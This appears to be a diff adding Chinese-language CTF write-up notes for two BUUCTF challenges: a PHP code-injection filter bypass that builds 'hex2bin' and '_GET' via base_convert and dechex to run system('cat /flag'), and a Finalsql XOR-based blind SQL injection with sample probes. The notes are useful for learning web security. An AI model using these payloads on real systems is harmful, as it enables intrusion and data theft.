@@ -402,3 +402,65 @@ payload:
 
 拿到flag
 
+
+
+# buuctf love math
+
+- 知识点:php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数比如下面的代码会执行 system(‘cat/flag’);
+
+期望执行:
+
+`?c=($_GET[a])($_GET[b])&a=system&b=cat /flag`
+
+但是`_GET`,`a`,`b`,`[]`都被过滤
+
+
+
+hex2bin()可以把十六进制值的字符串转换为ascii字符
+
+hex2bin(5f474554)就可以构造`_GET`
+
+
+
+所以要构造`hex2bin函数`和`5f474554`
+
+观察白名单里的函数
+
+把hex2bin看成36进制
+
+hex2bin=base_convert(37907361743,10,36)
+
+同理:
+
+`5f474554`=dechex(1598506324)
+
+构造payload:
+
+`/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag`
+
+对于这个payload的理解:
+
+c的值为`$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})`
+
+前面的`$pi`和后面的`pi`不是一个概念,不会影响
+
+
+
+# buuctf Finalsql
+
+对于5个页面,id=6时也有一个页面
+
+可以使用异或注入:
+
+`?id=1^(1=1)^1`
+
+回显正常
+
+可以在括号中间加入payload
+
+也可以使用:
+
+`''or(ascii(substr(database(),1,1))>32)`
+
+接下来使用盲注脚本即可
+
